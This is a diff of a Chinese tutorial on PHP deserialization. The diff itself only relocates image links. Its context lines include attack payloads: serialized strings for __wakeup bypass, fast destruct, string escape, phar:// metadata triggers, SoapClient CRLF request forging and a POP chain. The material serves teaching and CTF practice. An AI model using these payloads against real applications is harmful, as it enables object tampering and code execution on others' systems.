@@ -1033,11 +1033,11 @@ $a = new sakura();
 print (serialize($a));
 ```
 
-[![image-20221209165156822](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209165156822.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209165156822.png)
+[![image-20221209165156822](../../../_assets/images/13c557315a217638df55c580dc3ef6b9d62310640bfe2799912b7770f866ac3f.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209165156822.png)
 
 **序列化数据格式**
 
-[![image-20221209162056383](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209162056383.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209162056383.png)
+[![image-20221209162056383](../../../_assets/images/a00e2da32d09c9cc2c7b8cc8fb92d9488a77c4ad4047f5910b0f1433d3d1e1ae.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209162056383.png)
 
 # 常用魔术方法总结
 
@@ -1402,7 +1402,7 @@ print (serialize($a)."\r\n");
 
 运行一下
 
-[![image-20221209170709748](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209170709748.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209170709748.png)
+[![image-20221209170709748](../../../_assets/images/9552155933d9a1052597724533bc44809fe1c07de33f9917f87f9178ae181534.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209170709748.png)
 
  这是我们序列化的过程
 
@@ -1434,7 +1434,7 @@ $b = 'O:6:"sakura":2:{s:1:"a";s:2:"HY";s:1:"b";s:3:"666";}';
 unserialize($b);
 ```
 
-[![image-20221209171216201](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209171216201.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209171216201.png)
+[![image-20221209171216201](../../../_assets/images/3d25a5f5c8b67ff9e065f5dc562582baf4914d7d55807340b40d628e6ce7c786.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209171216201.png)
 
 这里由于我们没有new一个对象的操作，所以就没有执行`__construct`方法
 
@@ -1467,7 +1467,7 @@ $a = 'O:1:"A":1:{s:4:"test";s:2:"HY";}';
 unserialize($a);
 ```
 
-[![image-20221210172357978](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210172357978.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210172357978.png)
+[![image-20221210172357978](../../../_assets/images/ff1cd8971e86f17da876832dabf559b6405643710c16632dd00ca62057139400.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210172357978.png)
 
 # 指针引用
 
@@ -1492,7 +1492,7 @@ echo "\n";
 echo serialize($b);
 ```
 
-[![image-20221209203846002](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209203846002.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209203846002.png)
+[![image-20221209203846002](../../../_assets/images/7e76f06f0cf719f64e5bc2c8a2b1efad3bd940869e847d5eb9a246310aa4bed6.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209203846002.png)
 
 我们发现,这里变量 $a 的 value 字段的值被序列化成了 r:1，而 $b 的 value 字段的值被序列化成了 R:1
 
@@ -1516,7 +1516,7 @@ var_dump($a);
 var_dump($b);
 ```
 
-[![image-20221209204547992](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209204547992.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209204547992.png)
+[![image-20221209204547992](../../../_assets/images/684ada01c9ccad919d976ef5b7571d7b1e6382be36fbfe73dd6ceed47fc81afc.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209204547992.png)
 
 这表示，当我们改变`$a->value`的值时，仅仅改变了`$a->value`的值,但是当我们改变`$b->value`的值时，却改变了$b的本身
 
@@ -1572,7 +1572,7 @@ print serialize($a);
 //O:4:"File":2:{s:8:"filename";s:8:"flag.php";s:6:"secret";N;}
 ```
 
-[![image-20221209233516920](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233516920.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209233516920.png)
+[![image-20221209233516920](../../../_assets/images/8ebc8baa0aeb33efe56c3f31f7724c6d59bd1b29970732505c281578a92ec538.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209233516920.png)
 
 如图，由于`__wakeup`魔术方法的存在`$filename`从我们传入的`flag.php`变为了`nonoflag`,然后尝试使用fast destruct
 
@@ -1581,13 +1581,13 @@ O:4:"File":3:{s:8:"filename";s:8:"flag.php";s:6:"secret";N;}
 O:4:"File":2:{s:8:"filename";s:8:"flag.php";s:6:"secret";N;
 ```
 
-[![image-20221209233659929](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233659929.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209233659929.png)
+[![image-20221209233659929](../../../_assets/images/b281cbcd494c7f774d3d676469ce3a1078bc37ab084d4da21ba0a9f37227395e.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209233659929.png)
 
-[![image-20221209233712131](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209233712131.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209233712131.png)
+[![image-20221209233712131](../../../_assets/images/487081df44a2d95bc73a696bcf466adc20234802eab77a25151222dd2318d09d.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209233712131.png)
 
 如上图，最终都失败了，所以我们要尝试看有没有其它办法,由于这里并不止`filename`一个变量,而且`__wakeup`里有这样一行代码
 
-[![image-20221209234010104](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209234010104.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209234010104.png)
+[![image-20221209234010104](../../../_assets/images/eaa6f7d541c963e5228601fbe448393724d0bb57f5b23476c4879e5e29392218.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209234010104.png)
 
 是不是觉得很眼熟,由此我们可以尝试引入我们上文讲的指针引用
 
@@ -1608,7 +1608,7 @@ print serialize($a);
 
 然后反序列化的同时给`secret`传入`flag.php`
 
-[![image-20221210000052881](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210000052881.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210000052881.png)
+[![image-20221210000052881](../../../_assets/images/f1ff1c47a647e1bf1daecdbb8c754f8b65b90522af901795b787417af982b99f.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210000052881.png)
 
 神奇的事情发生了，`filename`的值成功变为`flag.php`了
 
@@ -1650,13 +1650,13 @@ unserialize(match($b));
 unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
 ```
 
-[![image-20221210010008949](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210010008949.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210010008949.png)
+[![image-20221210010008949](../../../_assets/images/3472cff45ae84e95eab768bec4bb102b9af703abd2c5fa3d3e7ffaaa47a3fab9.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210010008949.png)
 
 # fast destruct(绕过__wakeup)
 
 今天介绍的这个技巧被称为`fast destruct`，可以在`unserialize`函数执行完后，立即触发我们的poc,这样就可以绕过一些限制，如`__wakeup`魔术方法
 
-[![image-20221209200143603](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209200143603.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209200143603.png)
+[![image-20221209200143603](../../../_assets/images/0d5d5d33a078e2fe56dea813204ef82613bccb7961c852b111fb4140a4040781.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209200143603.png)
 
 - 存在漏洞的PHP版本: PHP5.6.25之前版本和7.0.10之前的7.x版本
 - 漏洞概述: `__wakeup()`魔法函数被绕过,导致执行了一些非预期效果的漏洞
@@ -1692,7 +1692,7 @@ unserialize($b);
 
 正常反序列化过程:
 
-[![image-20221209201038411](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209201038411.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209201038411.png)
+[![image-20221209201038411](../../../_assets/images/b761404c7f07da941ecbfc3952a6e11e66794fc02e6bb68ad785d84f9d5c7975.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209201038411.png)
 
 **1.修改序列化数字元素个数**
 
@@ -1700,7 +1700,7 @@ unserialize($b);
 O:6:"sakura":3:{s:1:"a";s:2:"HY";s:1:"b";s:3:"666";}  //我这里讲2改为了3
 ```
 
-[![image-20221209201155305](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209201155305.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209201155305.png)
+[![image-20221209201155305](../../../_assets/images/1c3c463d592065daf3a9f8d7d8220ea62389887d4be8eb6c6750cfedf4d82fbd.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209201155305.png)
 
 我们发现只执行了`__destruct`方法，而没有执行`__wakeup`方法，成功绕过了`__wakeup`魔术方法的执行
 
@@ -1735,7 +1735,7 @@ $a = new test();
 echo serialize($a);
 ```
 
-[![image-20221210004733397](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210004733397.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210004733397.png)
+[![image-20221210004733397](../../../_assets/images/1bb542caad623e10751609c44b30bc7ffcf967686471ee5207e512e4b8b223cd.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210004733397.png)
 
 但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有`\x00*\x00`也依然会输出`abc`
 
@@ -1793,7 +1793,7 @@ $a = check($a);
 unserialize($a);
 ```
 
-[![image-20221210010741617](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210010741617.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210010741617.png)
+[![image-20221210010741617](../../../_assets/images/a2bd1e7964e99c83a3e93f43b9f3d61bd9764c07885e5ddc25f1152fc7385194.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210010741617.png)
 
 如图，处理后成功的绕过了!
 
@@ -1835,9 +1835,9 @@ class sakura#1 (2) {
 O:6:"sakura":2:{s:4:"name";s:2:"HY";s:3:"age";s:2:"25";}123
 ```
 
-[![image-20221210013324096](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210013324096.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210013324096.png)
+[![image-20221210013324096](../../../_assets/images/38a8b50fbd25ec9647ccb623755bbf6ddba3395757804d97c4ae0a8c6316a40f.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210013324096.png)
 
-[![image-20221210012901305](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210012901305.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210012901305.png)
+[![image-20221210012901305](../../../_assets/images/fb0819034954f31922da9a10b9a2e041d867bfcf173636b6f048b5eae08705c4.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210012901305.png)
 
 我们发现并没有什么改变，说明{}是字符串反序列化时的分界符，在进行反序列化时，是从左到右读取。读取多少取决于s后面的字符长度
 
@@ -1847,7 +1847,7 @@ O:6:"sakura":2:{s:4:"name";s:2:"HY";s:3:"age";s:2:"25";}123
 O:6:"sakura":2:{s:5:"name";s:2:"HY";s:3:"age";s:2:"25";}
 ```
 
-[![image-20221210013348276](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210013348276.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210013348276.png)
+[![image-20221210013348276](../../../_assets/images/4a14fa983bcd0ba22f05d1cc2652840f006a704ace6e61dcf43f74949c317797.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210013348276.png)
 
 此时在读取name时，它会将闭合的双引号也读取在内，而需要闭合字符串的双引号被当作字符串处理，这时就会导致语法错误而报错。
 
@@ -1888,17 +1888,17 @@ unserialize($str);
 
 我们先随意传入一个名字
 
-[![image-20221210014745476](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210014745476.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210014745476.png)
+[![image-20221210014745476](../../../_assets/images/bebe602b70d86fbd8e5f909f1d89ac68e96d5defb839ca6ab8a836e295214f17.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210014745476.png)
 
 如果我们传入带有H的名字会怎么样呢?
 
-[![image-20221210014915564](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210014915564.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210014915564.png)
+[![image-20221210014915564](../../../_assets/images/6f779cf0cc1674e410ec58f14a8b1524cb067c6a8852f5ed4a5a06df83d88c35.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210014915564.png)
 
 我们可以发现名字由 HY变为了 HHY
 
 我们输入很多H呢?
 
-[![image-20221210015149828](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210015149828.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210015149828.png)
+[![image-20221210015149828](../../../_assets/images/2e8e94703d48848acdf67bfa2fe8a602ca64b5562015ebd8f8493c6bb804a140.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210015149828.png)
 
 神奇的事情发生了,过滤后的序列化字符串名字长度仍然是9,但是实际上它的长度早已经超过9了,所以我们就可以利用这点来构造字符串逃逸
 
@@ -1910,7 +1910,7 @@ unserialize($str);
 
 这些是我们需要传入的,但是我们还要计算下它有多长，然后选择合适的H的个数去逃逸它
 
-[![image-20221210015919846](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210015919846.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210015919846.png)
+[![image-20221210015919846](../../../_assets/images/72608f08048c45153c6b4e2e449956fd9b0a35f77b07885d2de914da817be889.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210015919846.png)
 
 我们需要逃逸22个字符，每多一个H我们可以逃逸一个字符，所以我们需要22个H，由此我们可以传入
 
@@ -1920,7 +1920,7 @@ HHHHHHHHHHHHHHHHHHHHHH";s:3:"age";s:2:"99";}
 
 我们来看看效果
 
-[![image-20221210020543648](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210020543648.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210020543648.png)
+[![image-20221210020543648](../../../_assets/images/e2d3198ac13b1640b70606d8b4d1f080693e7f4b424b0116c64f76243f57289d.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210020543648.png)
 
 我们成功完成了字符串逃逸，改变了age的值！
 
@@ -1959,7 +1959,7 @@ unserialize($str);
 
 也就是每输入两个HH就会变为一个H
 
-[![image-20221210020923726](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210020923726.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210020923726.png)
+[![image-20221210020923726](../../../_assets/images/b2ba5f2288e6ac058e52d223c3f32d613e91f7e7fad6cf480d27ddc6ffa5a792.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210020923726.png)
 
 但是原理是有所不同的，字符增加主要是使s包含的范围被我们的垃圾字符填充，然后会继续反序列化我们恶意的字符串,由于它本来带的那部分序列化内容被我们用}截断，所以并没有起效果
 
@@ -1996,7 +1996,7 @@ print "改变后sakura的年龄为:";
 unserialize($str);
 ```
 
-[![image-20221210165137214](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210165137214.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210165137214.png)
+[![image-20221210165137214](../../../_assets/images/0619fd65f38a16ae54576b5d5b5b29a2c3fa43ffe1f2c2d3d3b68f2b6ad1c2aa.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210165137214.png)
 
 ```
 O:6:"sakura":2:{s:4:"name";s:2:"HY";s:3:"age";s:2:"25";}
@@ -2004,7 +2004,7 @@ O:6:"sakura":2:{s:4:"name";s:2:"HY";s:3:"age";s:2:"25";}
 
 我们尝试多给name一些H看会发生什么
 
-[![image-20221210165216207](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210165216207.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210165216207.png)
+[![image-20221210165216207](../../../_assets/images/775ba476f8024096bb00247d8c31819bcd21d869546983e32112e87b88fc467a.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210165216207.png)
 
 我们发现name的值的范围已经大于了HH，所以把`";`也包含进去了,所以我们是不是可以让它把原来的age部分全部包含，让php反序列化我们传入的恶意序列化值呢?
 
@@ -2020,7 +2020,7 @@ O:6:"sakura":2:{s:4:"name";s:2:"HY";s:3:"age";s:2:"25";}
 ";s:3:"age";s:21:"25  //20个字符
 ```
 
-[![image-20221210170054095](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210170054095.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210170054095.png)
+[![image-20221210170054095](../../../_assets/images/f8401c09b26df3b74eaa2fd45715fd5ee684da00182e1c85cb493927db0b1176.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221210170054095.png)
 
 # phar反序列化
 
@@ -2053,7 +2053,7 @@ stub:标识作用，格式为xxx，前面任意，但是一定要以__HALT_COMPI
 
 manifest describing the contents:其实可以理解为phar文件本质上是一种压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；
 
-[![image-20221211172536017](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221211172536017.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221211172536017.png)
+[![image-20221211172536017](../../../_assets/images/63e2d53fbae199f62dc03dd83f664d1708dd8a44bda265906aa2b05b0c5b0fb9.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221211172536017.png)
 
 the file contents:这里指的是被压缩文件的内容；
 
@@ -2095,17 +2095,17 @@ $phar->stopBuffering();
 
 访问一下，发现同目录下生成了一个.phar后缀的文件(如果这步无法创建，请修改php.ini的配置，设置phar.readonly = off 并去掉前面的分号)
 
-[![image-20211027213811961](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027213811961.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20211027213811961.png)
+[![image-20211027213811961](../../../_assets/images/04a9e3ae04c71cb85740aa803a594f6b9c61db158c318f8fa445f5c53762f67e.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20211027213811961.png)
 
 打开：
 
-[![image-20211027215216183](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027215216183.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20211027215216183.png)
+[![image-20211027215216183](../../../_assets/images/30685e34171b7b2ff0d98f3acb65998e2b5354b0826d0db052be1b883aa7bc42.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20211027215216183.png)
 
 发现写入的内容已经被序列化。
 
 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：
 
-[![image-20221211172631232](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221211172631232.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221211172631232.png)
+[![image-20221211172631232](../../../_assets/images/122362df717b7971189d3167155861b9ca046eb893f152a6d9967af3bc66c0ee.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221211172631232.png)
 
 当然不止上面这些
 
@@ -2192,7 +2192,7 @@ include('phar://phar.phar');
 ?>
 ```
 
-[![image-20211027215532641](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027215532641.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20211027215532641.png)
+[![image-20211027215532641](../../../_assets/images/a2fbfe716a4719b2c328f371801806a96b5375491d761151ada29d850c241cce.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20211027215532641.png)
 
 我们来简要说明下整个调用流程：
 
@@ -2339,7 +2339,7 @@ $c = unserialize($b);
 $c->not_exists_function();
 ```
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png)
+[![img](../../../_assets/images/a5f1e31f04385c4489a2d9e5c926148ca850536860b2484991ad552a0f5060a5.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png)
 
 **CRLF**
 
@@ -2358,9 +2358,9 @@ $c->not_exists_function();
 
 第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png)
+[![img](../../../_assets/images/e7c8934ebc04ee6e3d034f67238f025da0f0d47ee2fc62f871418a80476cb073.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png)
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png)
+[![img](../../../_assets/images/3dec1cc13885b10b2666fd2210caa0eef40d7e1909c5ac379135abf5b9c01351.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png)
 
 但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据
 
@@ -2391,9 +2391,9 @@ $c->not_exists_function();
 ?>
 ```
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png)
+[![img](../../../_assets/images/1321f8c378ce7cac689b2cafa84838add7f1b93efc38d050d9e6e8bdcd5ff23c.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png)
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png)
+[![img](../../../_assets/images/d7788ae0e762d6480da74be9efc9f51f9334b3caa5291f5505711f1aa6c2cb55.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png)
 
 如上，使用SoapClient[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)+CRLF**可以生成任意POST请求**。
 
@@ -2570,11 +2570,11 @@ print (serialize($B));
 O:1:"B":3:{s:1:"a";O:1:"C":2:{s:1:"a";s:7:"phpinfo";s:1:"c";O:1:"A":2:{s:1:"a";s:11:"0e215962017";s:1:"b";r:2;}}s:1:"b";N;s:1:"k";N;
 ```
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572452999-4c7c0d9f-7e02-4554-b6fe-3cb50bd081e1.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669572452999-4c7c0d9f-7e02-4554-b6fe-3cb50bd081e1.png)
+[![img](../../../_assets/images/d9ea5603b0dc2c4132570ff0155d8dc0e6fcb9ad3840e9c900ad960ba4d2b70b.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669572452999-4c7c0d9f-7e02-4554-b6fe-3cb50bd081e1.png)
 
 ### php session反序列化
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572514590-86d553ce-17ed-4ceb-9380-f387e618fb16.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669572514590-86d553ce-17ed-4ceb-9380-f387e618fb16.png)
+[![img](../../../_assets/images/9cbf68047b4fae650ba468ee02c43f6e23410afbfc647d8415c4f8fb2c477361.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669572514590-86d553ce-17ed-4ceb-9380-f387e618fb16.png)
 
 php中的seiion中的内容并不是放在内存中的，而是以文件的方式来存储的，存储的方式就是由配置项session_save_handler来进行确定的，默认是以文件的方式存储。
 
@@ -2608,7 +2608,7 @@ sess=|xxx
 
 而在flag.php中有
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572974964-ddcf9fb4-9d32-4e4e-9206-4bdb6d083974.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669572974964-ddcf9fb4-9d32-4e4e-9206-4bdb6d083974.png)
+[![img](../../../_assets/images/e60c839754a86a670c9f2721f7eb82f3f5976bac506fa7d35eae1905107e9b45.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669572974964-ddcf9fb4-9d32-4e4e-9206-4bdb6d083974.png)
 
